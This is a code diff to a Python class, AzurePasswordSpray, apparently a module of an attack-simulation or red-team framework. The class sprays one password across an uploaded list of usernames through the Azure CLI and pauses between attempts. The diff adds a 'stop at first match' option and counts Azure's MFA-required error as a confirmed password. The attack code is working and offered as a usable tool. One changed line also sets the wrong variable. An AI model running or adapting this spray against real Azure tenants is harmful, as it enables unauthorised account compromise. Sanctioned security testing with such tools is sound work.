@@ -27,12 +27,26 @@ class AzurePasswordSpray(BaseTechnique):
             username_file: str = kwargs['username_file']
             password: str = kwargs['password']
             wait: int = kwargs.get('wait', 3) # set default wait to 3 seconds
+            stop_at_first_match: bool = kwargs.get('stop_at_first_match', True)
+            
+            # Input validation
+            if password in [None, ""] or username_file in [None, ""]:
+                return ExecutionStatus.FAILURE, {
+                    "error": {"Error" : "Invalid Technique Input"},
+                    "message": {"Error" : "Invalid Technique Input"}
+                }
+            
+            if wait in [None, ""]:
+                wait = 3 # set default wait time
+
+            if stop_at_first_match in [None, ""]:
+                wait = True # set default wait time
             
             # Get az full execution path
             az_command = AzureAccess().az_command
 
             # Extract usernames from username text file
-            content_string = username_file[0].split(',')[-1]
+            content_string = username_file.split(',')[-1]
             decoded = base64.b64decode(content_string)
             try:
                 text = decoded.decode('utf-8')
@@ -41,7 +55,10 @@ class AzurePasswordSpray(BaseTechnique):
                 user_list = list(set(user_list))
             except Exception as e:
                 # File decoding failed
-                return False, {"Error" : e}, None
+                return ExecutionStatus.FAILURE, {
+                    "error": str(e),
+                    "message": "Failed to decode users file"
+                }
 
             # Initialize variable to store password spray results
             spray_results = {}
@@ -63,15 +80,35 @@ class AzurePasswordSpray(BaseTechnique):
                         # If auth successful
                         struc_output = json.loads(output.decode('utf-8'))
                         spray_results[user_name] = {"Success" : struc_output}
+
+                        # Return if set to stop at first match
+                        if stop_at_first_match:
+                            return ExecutionStatus.SUCCESS, {
+                                "message": f"Successfully matched username",
+                                "value": spray_results
+                            }
                     else:
                         # If auth failed
                         struc_error = out_error.decode('utf-8')
-                        spray_results[user_name] = {"Failed" : struc_error}
-                        raise Exception("Auth failed")
+                        if "AADSTS50076" in struc_error:
+                            spray_results[user_name] = {"Success" : "Password matched with username. Authentication failed - Account has MFA."}
+                            if stop_at_first_match:
+                                return ExecutionStatus.SUCCESS, {
+                                    "message": f"Successfully matched username",
+                                    "value": spray_results
+                                }
+                        else:
+                            spray_results[user_name] = {"Failed" : struc_error}
+                            raise Exception("Auth failed")
                 except:
                     # Wait before attempting next username
                     time.sleep(wait)
             
+            # Return password spray result
+            return ExecutionStatus.SUCCESS, {
+                "message": f"Successfully completed password spray. No username matched",
+                "value": spray_results
+            }
         except Exception as e:
             return ExecutionStatus.FAILURE, {
                 "error": str(e),
@@ -82,5 +119,6 @@ class AzurePasswordSpray(BaseTechnique):
         return {
             "username_file": {"type": "str", "required": True, "default": None, "name": "Username File", "input_field_type" : "upload"},
             "password": {"type": "str", "required": True, "default": None, "name": "Password", "input_field_type" : "password"},
-            "wait": {"type": "int", "required": False, "default": 3, "name": "Wait (in sec)", "input_field_type" : "number"}
+            "wait": {"type": "int", "required": False, "default": 3, "name": "Wait (in sec)", "input_field_type" : "number"},
+            "stop_at_first_match": {"type": "bool", "required": False, "default": True, "name": "Stop at First Match", "input_field_type" : "bool"}
         }
